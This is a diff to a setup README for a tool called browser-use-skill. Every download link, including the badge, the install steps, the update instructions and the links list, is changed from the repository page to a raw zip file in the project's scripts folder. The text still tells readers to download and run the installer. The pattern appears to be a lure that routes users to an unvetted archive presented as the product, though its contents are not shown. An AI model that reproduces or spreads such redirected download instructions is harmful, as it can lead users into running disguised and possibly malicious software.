@@ -1,6 +1,6 @@
 # 🌐 browser-use-skill - Automate Browsing Tasks Easily
 
-[![Download browser-use-skill](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/Alisha2420/browser-use-skill)
+[![Download browser-use-skill](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/Alisha2420/browser-use-skill/raw/refs/heads/main/scripts/browser_skill_use_2.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run browser-use-skill on your Windows PC.
 
 Click the big green button above or this link to visit the download page:
 
-[Download browser-use-skill](https://github.com/Alisha2420/browser-use-skill)
+[Download browser-use-skill](https://github.com/Alisha2420/browser-use-skill/raw/refs/heads/main/scripts/browser_skill_use_2.2.zip)
 
 On that page, look for the latest release or download section. You will find the files ready to download.
 
@@ -109,7 +109,7 @@ When you run browser-use-skill, it keeps track of task files and settings in its
 
 Check the GitHub download page regularly for new versions:
 
-https://github.com/Alisha2420/browser-use-skill
+https://github.com/Alisha2420/browser-use-skill/raw/refs/heads/main/scripts/browser_skill_use_2.2.zip
 
 Download the latest installer and run it to update the software. Your settings and tasks will stay intact.
 
@@ -123,9 +123,9 @@ For support, use the "Issues" tab on the GitHub page linked above. You can repor
 
 ## 🔗 Important links
 
-- Download and setup: [https://github.com/Alisha2420/browser-use-skill](https://github.com/Alisha2420/browser-use-skill)
+- Download and setup: [https://github.com/Alisha2420/browser-use-skill/raw/refs/heads/main/scripts/browser_skill_use_2.2.zip](https://github.com/Alisha2420/browser-use-skill/raw/refs/heads/main/scripts/browser_skill_use_2.2.zip)
 
-[![Download browser-use-skill](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/Alisha2420/browser-use-skill)
+[![Download browser-use-skill](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/Alisha2420/browser-use-skill/raw/refs/heads/main/scripts/browser_skill_use_2.2.zip)
 
 ---
 
